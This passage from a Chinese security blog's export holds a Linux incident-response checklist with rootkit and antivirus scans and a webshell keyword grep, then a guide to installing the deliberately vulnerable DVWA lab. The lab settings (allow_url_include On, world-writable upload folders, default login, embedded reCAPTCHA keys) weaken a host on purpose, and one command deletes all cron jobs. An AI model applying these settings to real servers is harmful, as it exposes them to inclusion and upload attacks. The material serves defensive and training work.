href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h2><h3 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list </span><br></pre></td></tr></table></figure><table><thead><tr><th>数字</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>单用户模式</td></tr><tr><td>2</td><td>无网络连接的多用户命令行模式</td></tr><tr><td>3</td><td>有网络连接的多用户命令行模式</td></tr><tr><td>4</td><td>表示不可用</td></tr><tr><td>5</td><td>带图形界面的多用户模式</td></tr><tr><td>6</td><td>表示重新启动</td></tr></tbody></table><blockquote><p>查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。</p></blockquote><p><code>/etc/init.d</code>目录</p><blockquote><p>init.d目录中的脚本都是<strong>以服务的形式</strong>启动的,系统在执行init.d目录中的服务脚本时，会分别单独为每个服务脚本启动一个非登录非交互式shell来始终在后台运行服务脚本一直到用户退出登录，关闭系统.</p></blockquote><p><code>/etc/rc.d/rc.local</code>目录</p><blockquote><p>系统初始化级别脚本运行之后再执行的，因此可以安全地在里面添加你想在系统启动之后执行的脚本</p></blockquote><p>详见<a href="https://cloud.tencent.com/developer/article/1533529">Linux之init.d、rc.d文件夹说明</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --type=service |grep enabled</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service --status-all</span><br></pre></td></tr></table></figure><h1 id="非易丢失数据"><a href="#非易丢失数据" class="headerlink" title="非易丢失数据"></a>非易丢失数据</h1><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211116191459348.png" alt="image-20211116191459348"></p><blockquote><p>左边是服务名称，右边是状态，enabled是开机启动，disabled是开机不启动  供应商预设(VENDOR PRESET)</p></blockquote><p>开启启动配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/rc.local</span><br><span class="line">/etc/rc.d/rc[0~6].d</span><br></pre></td></tr></table></figure><blockquote><p>当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在<code>/etc/init.d</code>目录下，然后在<code>/etc/rc.d/rc*.d</code>中建立软链接即可</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/rc.local</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alt /etc/init.d</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/init.d/rc.local</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/rc.d/rc[0~6]</span><br></pre></td></tr></table></figure><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><p><code>crontab -l</code> 列出某个用户cron服务的详细内容</p><blockquote><p>默认编写的crontab文件会保存在 (<code>/var/spool/cron/用户名</code> 例如: <code>/var/spool/cron/root</code>)</p></blockquote><p><code>crontab -u root -l</code></p><p><code>crontab -r</code> 删除每个用户cront任务(谨慎：删除所有的计划任务)</p><p><code>crontab -e</code> 使用编辑器编辑当前的crontab文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">more /etc/cron.daily/*  查看目录下所有文件</span><br></pre></td></tr></table></figure><h3 id="etc目录下的任务计划文件"><a href="#etc目录下的任务计划文件" class="headerlink" title="etc目录下的任务计划文件"></a>etc目录下的任务计划文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls /etc/cron*</span><br><span class="line">常见文件夹</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/*</span><br><span class="line">/etc/cron.hourly/*</span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/var/spool/cron/*</span><br></pre></td></tr></table></figure><h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">cat /用户家目录/.bash_history</span><br><span class="line">cat .bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure><p>保存1万条命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/^HISTSIZE=1000/HISTSIZE=10000/g&#x27; /etc/profile</span><br></pre></td></tr></table></figure><h2 id="异常文件"><a href="#异常文件" class="headerlink" title="异常文件"></a>异常文件</h2><h3 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h3><p>查看敏感目录（临时目录<code> /tmp</code>，命令目录<code>/usr/bin/ /usr/sbin</code>，网站目录等）</p><p><code>~/.ssh</code> <code>/etc/ssh</code> 经常作为后门配置路径</p><h3 id="时间点"><a href="#时间点" class="headerlink" title="时间点"></a>时间点</h3><p><code>find</code>命令：指定目录下查找文件</p><p>参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b/d/c/p/l/f</span><br></pre></td></tr></table></figure><p>块设备/目录/字符设备/管道/符号链接/普通文件</p><p><code>-n</code>:n天之内</p><p><code>+n</code>:n天以前</p><p><code>-mtime</code>:更改时间</p><p><code>-atime</code>:访问时间</p><p><code>-ctime</code>:创建时间</p><p>查找一天内新增的shell文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -ctime 0 -name &quot;*.sh&quot;</span><br></pre></td></tr></table></figure><p><code>stat</code>查看文件时间点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">stat</span> 1.sh</span></span><br><span class="line">  File: ‘1.sh’</span><br><span class="line">  Size: 0               Blocks: 0          IO Block: 4096   regular empty file</span><br><span class="line">Device: fd00h/64768d    Inode: 51317256    Links: 1</span><br><span class="line">Access: (0664/-rw-rw-r--)  Uid: ( 1000/ dropann)   Gid: ( 1000/ dropann)</span><br><span class="line">Context: unconfined_u:object_r:user_home_t:s0</span><br><span class="line">Access: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line">Modify: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line">Change: 2021-05-15 19:08:23.215045535 +0800</span><br><span class="line"> Birth: -</span><br><span class="line"></span><br><span class="line">Device: fd00h/64768d：文件所在设备号，分别以十六进制和十进制显示</span><br><span class="line">Inode: 51317256：文件节点号</span><br><span class="line">Links: 1：硬链接数</span><br><span class="line">Access: (0664/-rw-rw-r--)：访问权限</span><br><span class="line">Uid：所有者ID与名称</span><br><span class="line">Gid：所有者用户组ID与名称</span><br><span class="line">Access：最后访问时间</span><br><span class="line">Modify：最后修改时间</span><br><span class="line">Change：最后状态改变时间</span><br><span class="line">Birth -：无法获知文件创建时间。注意：Linux下的文件未存储文件创建时间</span><br></pre></td></tr></table></figure><table><thead><tr><th>时间</th><th>名称</th><th>中文</th><th>描述</th></tr></thead><tbody><tr><td>atime</td><td>Access</td><td>最近访问时间</td><td>最后一次访问文件（读取或执行）的时间</td></tr><tr><td>mtime</td><td>Modify</td><td>最近修改时间</td><td>最后一次修改文件（内容）或者目录（内容）的时间</td></tr><tr><td>ctime</td><td>Change</td><td>最近变化时间</td><td>最后一次改变文件（属性或权限）或者目录（属性或权限）的时间</td></tr></tbody></table><blockquote><ol><li>当读取文件时，atime改变，mtime和ctime不变</li><li>当修改文件时，atime，mtime，ctime都会改变</li><li>修改文件属性时，ctime改变，atime，mtime不变</li><li>more，less，cat，nl，tail，tac等命令会更改atime</li><li>ls，stat命令不会修改atime</li><li>通过chmod，chown修改文件属性，会更新ctime。touch则会更改atime，ctime，mtime</li></ol></blockquote><p>查看特定文件夹一天前访问的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /opt -iname &quot;*&quot; -atime 1 -type f</span><br></pre></td></tr></table></figure><h3 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h3><p>权限特殊如777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /tmp -perm 777</span><br></pre></td></tr></table></figure><p>文件类型+文件中关键字（查webshell）</p><p><code>xargs egrep</code>+关键字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /var/www/ -name &quot;*.php&quot; | xargs egrep &#x27;assert|phpspy|eval&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/he1m4n6a/findWebshell">https://github.com/he1m4n6a/findWebshell</a></p><p>系统命令是否被替换：查看命令目录的相关系统命令的修改时间，文件大小从而判断是否被修改。</p><p><code>ls -alt /bin</code>  修改时间</p><p><code>ls -alh /bin</code>  文件大小</p><h2 id="防火墙规则"><a href="#防火墙规则" class="headerlink" title="防火墙规则"></a>防火墙规则</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p><a href="https://dropann.github.io/p/c8bc8d54.html">Linux日志</a></p><h2 id="Rookit数据排查"><a href="#Rookit数据排查" class="headerlink" title="Rookit数据排查"></a>Rookit数据排查</h2><p>命令：<code>rootkithunter</code> <code>chkrootkit</code></p><h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p><a href="http://www.chkrootkit.org/">官网地址</a></p><p>下载源码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br></pre></td></tr></table></figure><p>安装编译工具包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ make glibc-static</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense </span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chkrootkit</span><br></pre></td></tr></table></figure><blockquote><p>出现INFECTED就说明系统可能有问题了</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chkrootkit | grep INFECTED</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211117111158425.png" alt="image-20211117111158425"></p><blockquote><p>这里是个误报，<code>/tmp</code>目录下存在可执行文件</p></blockquote><p><a href="https://www.cnblogs.com/binyue/p/4707948.html">Linux下如何查找可执行文件</a></p><h3 id="rootkithunter"><a href="#rootkithunter" class="headerlink" title="rootkithunter"></a>rootkithunter</h3><p>RKHunter是专业检测系统是否感染rootkit的工具，通过执行一系列脚本来确定服务器是否感染rootkit。RKHunter可以做到：</p><ol><li>MD5校验测试, 检测任何文件是否改动.</li><li>检测rootkits使用的二进制和系统工具文件.</li><li>检测特洛伊木马程序的特征码.</li><li>检测大多常用程序的文件异常属性.</li><li>执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台.</li><li>扫描任何混杂模式下的接口和后门程序常用的端口.</li><li>检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告.</li><li>对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等.</li></ol><p><a href="http://rkhunter.sourceforge.net/">官网地址</a></p><p>下载源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://onboardcloud.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz --no-check-certificate</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf rkhunter-1.4.6.tar.gz</span><br><span class="line">cd rkhunter-1.4.6</span><br><span class="line">./installer.sh --install</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter -c</span><br></pre></td></tr></table></figure><p>程序自动执行不用每个部分Enter继续</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --check --sk | grep Warning</span><br></pre></td></tr></table></figure><p>在线更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rkhunter --update</span><br></pre></td></tr></table></figure><h2 id="打包数据"><a href="#打包数据" class="headerlink" title="打包数据"></a>打包数据</h2><h3 id="打包网站数据"><a href="#打包网站数据" class="headerlink" title="打包网站数据"></a>打包网站数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cvf test.tar `find . -type f -name &quot;*.jsp*&quot;`</span><br></pre></td></tr></table></figure><blockquote><p>打包文件名中包含jsp的文件</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf test1.tar.gz /aaa/</span><br></pre></td></tr></table></figure><h3 id="打包日志数"><a href="#打包日志数" class="headerlink" title="打包日志数"></a>打包日志数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf var_log.tar.gz /var/log</span><br><span class="line">last &gt; last.log</span><br><span class="line">netstat -an &gt; netstat.log</span><br></pre></td></tr></table></figure><h3 id="打包数据库数据"><a href="#打包数据库数据" class="headerlink" title="打包数据库数据"></a>打包数据库数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">停止</span><br><span class="line">systemctl stop mysqld</span><br><span class="line">备份</span><br><span class="line">mysqldump -u root -p 数据库密码 数据库名称 &gt; 具体备份路径</span><br><span class="line">mysqldump -u root -p mysite &gt; /var/databakup/mysite.sql</span><br><span class="line">压缩</span><br><span class="line">tar -czvf mydql_data.tar.gz /var/lib/mysql/</span><br></pre></td></tr></table></figure><h1 id="病毒查杀"><a href="#病毒查杀" class="headerlink" title="病毒查杀"></a>病毒查杀</h1><h2 id="Clamav"><a href="#Clamav" class="headerlink" title="Clamav"></a>Clamav</h2><p><a href="http://www.clamav.net/download.html">官方地址下载</a></p><p><a href="https://docs.clamav.net/">操作手册</a></p><p><a href="http://www.vue5.com/centos/23049.html">在CentOS 7上安装ClamAV</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描方法</span></span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描并杀毒</span></span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line"><span class="meta">#</span><span class="bash">查看日志发现</span></span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure><h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><p><a href="http://www.shellpub.com/">河马webshell查杀</a></p><h1 id="安全检测脚本"><a href="#安全检测脚本" class="headerlink" title="安全检测脚本"></a>安全检测脚本</h1><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker初始化</title>
      <link href="/p/1ddb4f36.html"/>
      <url>/p/1ddb4f36.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4d7b5d5378afaf89845984d6c26acc07fd8b3039b83e67af7050f40d55992ee6"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA初始化</title>
      <link href="/p/603ea0ad.html"/>
      <url>/p/603ea0ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="centos7部署DVWA"><a href="#centos7部署DVWA" class="headerlink" title="centos7部署DVWA"></a>centos7部署DVWA</h2><h3 id="创建数据库和dvwa用户，设置远程访问"><a href="#创建数据库和dvwa用户，设置远程访问" class="headerlink" title="创建数据库和dvwa用户，设置远程访问"></a>创建数据库和dvwa用户，设置远程访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database dvwa;</span><br><span class="line">grant all on dvwa.* to dvwa@&#x27;%&#x27; identified by &#x27;dvwa12345&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="安装apache-php，启动httpd"><a href="#安装apache-php，启动httpd" class="headerlink" title="安装apache+php，启动httpd"></a>安装apache+php，启动httpd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum -y install apache2 php php-mysqli php-gd libapache2-mod-php</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure><h3 id="验证php"><a href="#验证php" class="headerlink" title="验证php"></a>验证php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;&lt;?php\nphpinfo();\n?&gt;&quot; &gt; /var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure><p>开放防火墙</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><h3 id="部署dvwa"><a href="#部署dvwa" class="headerlink" title="部署dvwa"></a>部署dvwa</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">git clone https://github.com/digininja/DVWA.git</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#太慢就直接下载zip上传上去</span></span></span><br><span class="line">unzip DVWA-master.zip</span><br><span class="line">mv DVWA-master dvwa</span><br><span class="line">cd /var/www/html/dvwa</span><br><span class="line">chmod -R 755 setup.php</span><br></pre></td></tr></table></figure><h4 id="初始化dvwa"><a href="#初始化dvwa" class="headerlink" title="初始化dvwa"></a>初始化dvwa</h4><p>访问<code>http://ip/dvwa/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA System error - config file not found. Copy config/config.inc.php.dist to config/config.inc.php and configure to your environment.</span><br></pre></td></tr></table></figure><p>进入<code>/var/www/html/dvwa/config</code>目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp config.inc.php.dist config.inc.php</span><br></pre></td></tr></table></figure><p><code>vim config.inc.php</code></p><p>配置数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_DVWA</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_server&#x27;</span> ]   = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_database&#x27;</span> ] = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_user&#x27;</span> ]     = <span class="string">&#x27;dvwa&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_password&#x27;</span> ] = <span class="string">&#x27;dvwa12345&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;db_port&#x27;</span>] = <span class="string">&#x27;3306&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意这里要是localhost，127.0.0.1不行</p></blockquote><p>添加keys，可访问<a href="https://www.google.com/recaptcha/admin">这里</a>获取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   You&#x27;ll need to generate your own keys at: https://www.google.com/recaptcha/admin</span></span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_public_key&#x27;</span> ]  = <span class="string">&#x27;6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6&#x27;</span>;</span><br><span class="line"><span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ] = <span class="string">&#x27;6LePqhAUAAAAAMVqhBbFr1NVA9H13FKyfAgBeZYx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>红字报错解决</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010184417942.png" alt="image-20211010184417942"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 更改成如下配置</span></span></span><br><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211010184822844.png" alt="image-20211010184822844"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[User: root] Writable folder /var/www/html/dvwa/hackable/uploads/: **No**</span><br><span class="line">[User: root] Writable file /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt: **No**</span><br><span class="line">[User: root] Writable folder /var/www/html/dvwa/config: **No**</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www/html/dvwa/hackableup/loads</span><br><span class="line">chmod 777 /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt</span><br></pre></td></tr></table></figure><p>配置完成后，重启httpd服务</p><p>登录用户名/密码 <code>admin/password</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/xjcn/p/12162437.html">https://www.cnblogs.com/xjcn/p/12162437.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 初始化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySql初始化</title>
      <link href="/p/44ce2ff7.html"/>
      <url>/p/44ce2ff7.html</url>
      
        <content type="html"><![CDATA[<h2 id="yum安装Mysql"><a href="#yum安装Mysql" class="headerlink" title="yum安装Mysql"></a>yum安装Mysql</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y mysql</span><br></pre></td></tr></table></figure><mark class="hl-label red">报错</mark>  没有mysqld服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# systemctl start mysqld</span><br><span class="line">Failed to start mysqld.service: Unit not found.</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/yuanchaoyong/p/9749060.html">CentOS7安装mysql后无法启动服务，提示Unit not found</a></p><p>方法一：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server -y //如果已安装可以省略</span><br><span class="line">systemctl start mariadb.service //启动服务</span><br><span class="line">systemctl enable mariadb.service //开机启动服务</span><br><span class="line">mysql -u root -p //登录mysql</span><br></pre></td></tr></table></figure><blockquote><p>使用MariaDB代替mysql数据库（MariaDB数据库管理系统是MySQL的一个分支，主要由开源社区在维护，采用GPL授权许可。开发这个分支的原因之一是：甲骨文公司收购了MySQL后，有将MySQL闭源的潜在风险，因此社区采用分支的方式来避开这个风险。）</p></blockquote><p>方法二：</p><p>这个方法就是在 <code>/etc/systemd/system/mysqld.service</code> 添加Unit,既然错误提示找不到Unit那我们添加一个就好了。在 <code>/etc/systemd/system/mysqld.service</code>下添加如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 